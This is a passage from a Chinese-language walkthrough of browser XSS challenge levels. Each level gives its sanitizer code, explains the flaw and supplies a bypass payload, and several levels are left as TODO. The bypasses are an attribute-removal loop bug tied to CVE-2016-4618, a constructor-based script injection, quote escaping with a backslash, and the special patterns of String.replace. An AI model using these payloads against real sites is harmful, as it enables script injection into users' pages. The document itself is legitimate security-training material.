    // remove certain characters that can be used to get vowels
    s = s.replace(/[{}!=<>\\]/g, '');
    return '<script>console.log("' + s + '");</script>';
}
```

又过滤了`{ } ! = < > \`，不能使用十六进制绕过

TODO



## Fruit

```javascript
// CVE-2016-4618
function escape(s) {
  var div = document.implementation.createHTMLDocument().createElement('div');
  div.innerHTML = s;
  function f(n) {
    if ('SCRIPT' === n.tagName) n.parentNode.removeChild(n);
    for (var i=0; i<n.attributes.length; i++) {
      var name = n.attributes[i].name;
      if (name !== 'class') { n.removeAttribute(name); }
    }
  }
  [].map.call(div.querySelectorAll('*'), f);
  return div.innerHTML;
}
```

开局一个cve？？？？

根据输入生成元素，会删除元素的属性

例

输入`<iframe onload=alert(1)>`

输出`<iframe></iframe>`

循环使用了`attributes.length`作为判断条件，这个值是某个元素中的属性数目，是动态变化的

比如开始是2，一轮循环删了一个，剩1，此时i=1，n.attributes.length=1，循环结束，剩一个没删

所以在onload前随便添加一个属性就完事了

Payload

```
<iframe a onload=alert(1)>
```

Output

```
<iframe onload="alert(1)"></iframe>
```



## Fruit 2

```javascript
// CVE-2016-7650
function escape(s) {
  var div = document.implementation.createHTMLDocument().createElement('div');
  div.innerHTML = s;
  function f(n) {
    if (/script/i.test(n.tagName)) n.parentNode.removeChild(n);
    for (var i=0; i<n.attributes.length; i++) {
      var name = n.attributes[i].name;
      if (name !== 'class') { n.removeAttribute(name); }
    }
  }
  [].map.call(div.querySelectorAll('*'), f);
  return div.innerHTML;
}
```

和上一题差不多

Payload

```
<iframe a onload=alert(1)>
```

Output

```
<iframe onload="alert(1)"></iframe>
```



## Fruit 3

```javascript
// Apple
function escape(s) {
  var div = document.implementation.createHTMLDocument().createElement('div');
  div.innerHTML = s;
  function f(n) {
    if (/script/i.test(n.tagName)) n.parentNode.removeChild(n);
    for (var i=0; i<n.attributes.length; i++) {
      var name = n.attributes[i].name;
      if (name !== 'class') { n.removeAttribute(name); i--; }
    }
  }
  [].map.call(div.querySelectorAll('*'), f);
  return div.innerHTML;
}
```

TODO



## Capitals

```javascript
// submitted by msamuel
function escape(s) {
  var capitals = {
    "CA": {
      "AB": "Edmonton",
      "BC": "Victoria",
      "MB": "Winnipeg",
      // etc.
    },
    "US": {
      // Alabama changed its state capital.
      "AL": ((year) => year < 1846 ? "Tuscaloosa" : "Montgomery"),
      "AK": "Juneau",
      "AR": "Phoenix",
      // etc.
    },
  };
 
  function capitalOf(country, stateOrProvinceName, year) {
    var capital = capitals[country][stateOrProvinceName];
    if (typeof capital === 'function') {
      capital = capital(year);
    }
    return capital
  }

  var inputs = (s || "").split(/#/g);
  return '<b>'+capitalOf(inputs[0], inputs[1], inputs[2])+'</b>';
}
```

输入根据#分割

需要使`typeof capital === 'function'`

而`capital = capitals[country][stateOrProvinceName]`

`country`和`stateOrProvinceName`和`year`都由输入决定

使capital为constructor，满足`typeof capital === 'function'`

在`capital = capital(year)`，执行

`constructor('</b><script>alert(1)</script>')`

返回`'</b><script>alert(1)</script>'`

Payload

```
CA#constructor#</b><script>alert(1)</script>
```

Output

```
<b></b><script>alert(1)</script></b>
```



## Quine

```javascript
// submitted by Somebody
function escape(s) {
    // We've got a quine level in all of the other
    // games, so why not have one here?
    var win = alert;
    window.alert = function(t) {
        if (t === s)
            win(1);
        else
            console.log("Alert: " + t + "\n(That's not a quine)");
    }
    return s;
}
```

TODO



## Entities

```javascript
// submitted by securityMB
function escape(s) {
  function htmlentities(s) {
    return s.replace(/[&<>"']/g, c => `&#${c.charCodeAt(0)};`)
  }
  s = htmlentities(s);
  return `<script>
  var obj = {};
  obj["${s}"] = "${s}";
</script>`;
}
```

转义了`& < > " '`

方括号拼接，转义引号，和前面的引号拼接，最后一个引号注释掉

Payload

```
];alert(1)//\
```

Output

```
<script>
  var obj = {};
  obj["];alert(1)//\"] = "];alert(1)//\";
</script>
```



## Entities 2

```javascript
// submitted by securityMB
function escape(s) {
  // Firefox-only
  function htmlentities(s) {
    return s.replace(/[&<>"']/g, c => `&#${c.charCodeAt(0)};`)
  }
  s = htmlentities(s);
  return `<textarea id=t></textarea>
<script>
  t.innerHTML = "${s}";
</script>`;
}
```

Firefox-only，告辞

TODO

## %level%

```javascript
// submitted anonymously
function escape(s) {
    const userInput = JSON.stringify(s).replace(/[<]/g, '%lt').replace(/[>]/g, '%gt');
    const userTemplate = '<script>let some = %userData%</script>';
    return userTemplate.replace(/%userData%/, userInput);
}
```

JSON.stringify()处理后又对尖括号进行编码

可利用的地方在`userTemplate.replace()`

`replace()`方法中替换字符串可以插入特殊变量名

| 变量名 | 代表的值                                                     |
| ------ | ------------------------------------------------------------ |
| $$     | 插入一个 "$"                                                 |
| $&     | 插入匹配的子串                                               |
| $`     | 插入当前匹配的子串左边的内容                                 |
| $'     | 插入当前匹配的子串右边的内容                                 |
| $n     | 假如第一个参数是RegExp对象，且 n 是个小于100的非负整数，那么插入第 n 个括号匹配的字符串 |

例

输入

```
$'$`
```

输出

```
<script>let some = "</script><script>let some = "</script>
```

成功闭合`<script>`

Payload

```
$'$`alert(1)//
```

Output

```
<script>let some = "</script><script>let some = alert(1)//"</script>
```

Console output

```
Error: Uncaught SyntaxError: Invalid or unexpected token
```

